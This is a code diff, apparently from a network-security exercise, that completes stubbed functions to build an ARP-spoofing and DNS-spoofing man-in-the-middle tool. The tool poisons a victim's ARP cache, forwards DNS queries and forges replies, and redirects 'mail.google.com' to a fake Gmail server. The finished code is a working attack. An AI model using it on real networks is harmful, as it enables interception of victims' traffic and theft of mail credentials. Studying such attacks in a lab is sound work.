@@ -16,7 +16,7 @@ FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
 REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
 SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
-    b"???": FAKE_GMAIL_IP
+    b"mail.google.com.": FAKE_GMAIL_IP
 }
 
 
@@ -49,15 +49,19 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        pass
+        if self.target_mac is None:
+            self.target_mac = getmacbyip(self.target_ip)
+        return self.target_mac
 
     def spoof(self) -> None:
         """
         Sends an ARP spoof that convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
-        """        
-
-        # Your code here...
+        """
+        target_mac = self.get_target_mac()
+        # ARP reply (op=2) telling target that spoof_ip is at our MAC
+        arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
+        scapy.send(arp_response, verbose=0)
 
         self.spoof_count += 1
 
@@ -111,7 +115,21 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return DNS response to pkt, source IP changed.
         """
-        pass
+        # Forward the DNS query to the real DNS server
+        dns_request = IP(dst=self.real_dns_server_ip) / \
+                      UDP(sport=pkt[UDP].sport, dport=53) / \
+                      DNS(rd=1, id=pkt[DNS].id, qd=pkt[DNSQR])
+        real_response = sr1(dns_request, verbose=0, timeout=5)
+
+        if real_response is None:
+            return None
+
+        # Build response back to victim, spoofing src as the network DNS server
+        response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                   UDP(dport=pkt[UDP].sport, sport=53) / \
+                   real_response[DNS]
+        scapy.send(response, verbose=0)
+        return response
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
